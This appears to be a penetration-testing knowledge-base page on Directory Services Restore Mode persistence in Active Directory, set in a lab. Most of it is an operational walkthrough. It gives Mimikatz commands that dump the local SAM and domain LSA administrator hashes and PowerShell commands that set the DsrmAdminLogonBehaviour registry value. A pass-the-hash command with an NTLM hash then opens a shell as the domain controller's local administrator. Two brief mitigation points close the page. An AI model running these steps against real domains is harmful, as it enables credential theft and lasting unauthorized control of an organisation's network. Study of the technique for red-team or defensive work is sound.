# DSRM

## Description

Directory Services Restore Mode (DSRM) is a safe boot mode which allows emergency access to the Domain Controller for database repairs and recovery. When Active Directory is initially setup the Administrator will be prompted for a password to use for DSRM if ever needed.

`Mimikatz` can be leveraged here to extract the local administrator (DSRM) hash and after making some registry changes, the hash and account can be used for persistence in the Domain.

{% hint style="info" %}
DSRM creates a local administrator account on the Domain Controller that is different from the Domain administrator account.
{% endhint %}

## Exploitation

The following lab consists of the following fully patched systems

* Windows Server 2019 - Domain Controller
* Windows 21H1 - Endpoint

This scenario takes places in the late stage kill chain, where the Domain Administrator's account has been compromised and the adversary has successfully loaded Mimikatz on both the Domain Controller and an endpoint.

### Domain Controller

Over on the Domain Controller the following commands have been executed using Mimikatz.

{% tabs %}
{% tab title="Mimikatz" %}
```bash
# Elevate to SYSTEM
privilege::debug
token::elevate
```

```bash
# Dump local administrator hash
lsadump::sam
```

```bash
# Dump Domain Administrator hash
lsadump::lsa /patch
```

We can see below where the Administrator hashes for the local (SAM) and Domain (LSA) accounts are different.

![](../../../.gitbook/assets/Screenshot\_20210916\_104114.png)
{% endtab %}
{% endtabs %}

Now, that the DSRM local administrator hash have been obtained, a registry key setting will need to be altered or created on the Domain Controller to enable persistence.

```yaml
# Check if key exists
Get-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour'

# If key exists and value is not set to 2
Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -Verbose

# If key does not exist then create it
New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose
```

## Endpoint

Over on a client endpoint on the network we have Mimikatz running with Domain Administrator privileges.&#x20;

```bash
privilege::debug
sekurlsa::pth /user:Administrator /domain:security.local /ntlm:0c564715b06bb035a87e91b9f71488a3
```

After this has been executed we see as per the image below a secondary command shell has been opened with the privileges of the local administrator of the Domain Controller on the endpoint Workstation-01.

![](<../../../.gitbook/assets/image (2014).png>)

## Mitigation's

* Regularly change DSRM passwords on all Domain Controllers that run DSRM. Ensuring the passwords are different across controllers.
* Monitor for the registry key `DsrmAdminLogonBehaviour` in `HKLM:\System\CurrentControlSet\Control\Lsa\` being set to the value of 1 or 2.

## References

{% embed url="https://adsecurity.org/?p=1785" %}
